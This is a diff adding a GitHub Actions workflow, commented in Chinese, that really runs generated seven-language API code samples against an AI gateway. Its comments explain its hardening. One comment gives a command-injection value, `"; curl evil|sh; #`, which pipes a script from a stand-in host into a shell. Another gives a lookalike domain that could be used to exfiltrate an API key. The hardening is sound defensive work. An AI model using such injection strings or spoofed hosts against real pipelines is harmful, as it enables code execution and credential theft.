@@ -1,0 +1,107 @@
+# verify-codegen —— Get Code 代码示例真实运行验证（TASK-XLWPEZ）。
+# 对指定模型,把包会生成的 协议 × 7 语言 示例逐个真实编译/运行、打网关看返回,
+# 确保给用户的示例「完全正确」。被测物是本仓 src/(包本身,与消费端 live-call/Get Code 同源),
+# 所以 workflow 必须住本仓——放别处需要复制 codegen,真值分叉。
+# （原先住 playground,被测物是它的 src/lib/codegen.ts;codegen 包化后真值搬到这里,脚本与
+#   workflow 一起迁过来。）
+#
+# ubuntu-latest 预装全部所需运行时(node/python/go/JDK/dotnet/ruby/curl),脚本按「探测到才跑」
+# 自动覆盖 7 语言;缺什么标 skip 不阻塞。
+#
+# secrets.VERIFY_API_KEY 必须与 base 匹配:打测试域传 base=https://test-gateway.example(测试站 key),
+# 默认 base=aihubmix.com 则须换主站 key。示例调用是真实计费,单模型约 14 次最小请求。
+name: verify-codegen
+
+# run-name 必须含 external_id:网关按「run-name 含 external_id」对账轮询(与 canon verify 同约定)
+run-name: verify-codegen ${{ inputs.model }}${{ inputs.stream == 'true' && ' (stream)' || '' }} ${{ inputs.external_id }}
+
+on:
+  workflow_dispatch:
+    inputs:
+      model:
+        description: '模型 id,如 gpt-5.5'
+        required: true
+        type: string
+      base:
+        description: '网关 base URL;空 = 脚本默认 https://aihubmix.com(须与 VERIFY_API_KEY 匹配)'
+        required: false
+        default: ''
+        type: string
+      stream:
+        description: 'true = 验证流式示例'
+        required: false
+        default: 'false'
+        type: string
+      external_id:
+        description: '网关侧 validation run id(vr-xxx),用于对账;手动触发可留空'
+        required: false
+        default: ''
+        type: string
+
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Set up pnpm
+        run: |-
+          corepack enable
+          corepack prepare pnpm@10.19.0 --activate
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: pnpm
+
+      # esbuild 是本仓 devDependency(两个 harness 都靠它把 src/index.ts 打成可 import 的 mjs),
+      # 所以这里不再全局装 —— pnpm install 之后 npx esbuild 直接命中本地版本,版本随 lockfile 钉死。
+      - name: Install dependencies
+        run: pnpm install --frozen-lockfile
+
+      # 无网络/无 key 的转义回归门:对抗内容(引号/反斜杠/Ruby #{}/字面 true)生成各语言代码并真语法校验,
+      # 抓住生成器转义回退(Java 文本块二次解转义 / Ruby 双引号 #{} 注入 / pyLiteral 误改字符串)。先跑,快、便宜。
+      - name: Codegen escaping regression
+        run: node scripts/test-codegen-escaping.mjs
+
+      # 同样无网络的单元测试(鉴权头/sdk 自洽/baseUrl 注入/config 完备性),真跑之前先把便宜的门关掉。
+      - name: Unit tests
+        run: pnpm test
+
+      # python 示例 import openai/anthropic;runner 裸 python 没有(本地开发机装过所以跑不出)。
+      - name: Install Python SDKs
+        run: pip install --quiet openai anthropic
+
+      - name: Run verify-codegen
+        env:
+          # key 按 base **精确匹配**选(不用 contains 子串——`https://aihubmix.com.evil.net`
+          # 能骗过子串匹配拿到 prod key,harness 再把它真发到攻击者域→凭证外泄)。
+          # 空 / 精确 aihubmix.com → 生产 key;精确 test-gateway.example → 测试 key;其余 → 空(下方 shell 拒)。
+          VERIFY_API_KEY: ${{ (inputs.base == '' || inputs.base == 'https://aihubmix.com') && secrets.VERIFY_API_KEY_PROD || inputs.base == 'https://test-gateway.example' && secrets.VERIFY_API_KEY || '' }}
+          # inputs 一律走 env 传入,**不**内联进 run: shell(内联会被 Actions 在 shell 解析前展开→
+          # `model` 传 `"; curl evil|sh; #` 即命令注入)。脚本内只用带引号的 "$VAR"。
+          MODEL_INPUT: ${{ inputs.model }}
+          BASE_INPUT: ${{ inputs.base }}
+          STREAM_INPUT: ${{ inputs.stream }}
+        run: |
+          set -o pipefail
+          # base 白名单:只允许已知网关域,拒绝任意 host(纵深防御,兜住 key 选择之外的误配/攻击)。
+          # base 现在会被直接注入进生成代码(ctx.baseUrl),白名单同时也是「示例里会出现哪些域」的闸门。
+          case "$BASE_INPUT" in
+            ""|"https://aihubmix.com"|"https://test-gateway.example") ;;
+            *) echo "invalid base: '$BASE_INPUT' (allowed: https://aihubmix.com, https://test-gateway.example)"; exit 1;;
+          esac
+          if [ -z "$VERIFY_API_KEY" ]; then echo "no API key resolved for base='$BASE_INPUT'"; exit 1; fi
+          ARGS=(--model "$MODEL_INPUT")
+          [ -n "$BASE_INPUT" ] && ARGS+=(--base "$BASE_INPUT")
+          [ "$STREAM_INPUT" = "true" ] && ARGS+=(--stream)
+          node scripts/verify-codegen.mjs "${ARGS[@]}" 2>&1 | tee verify-codegen-report.txt
+
+      - name: Upload report
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: verify-codegen-${{ inputs.model }}
+          path: verify-codegen-report.txt
+          if-no-files-found: warn
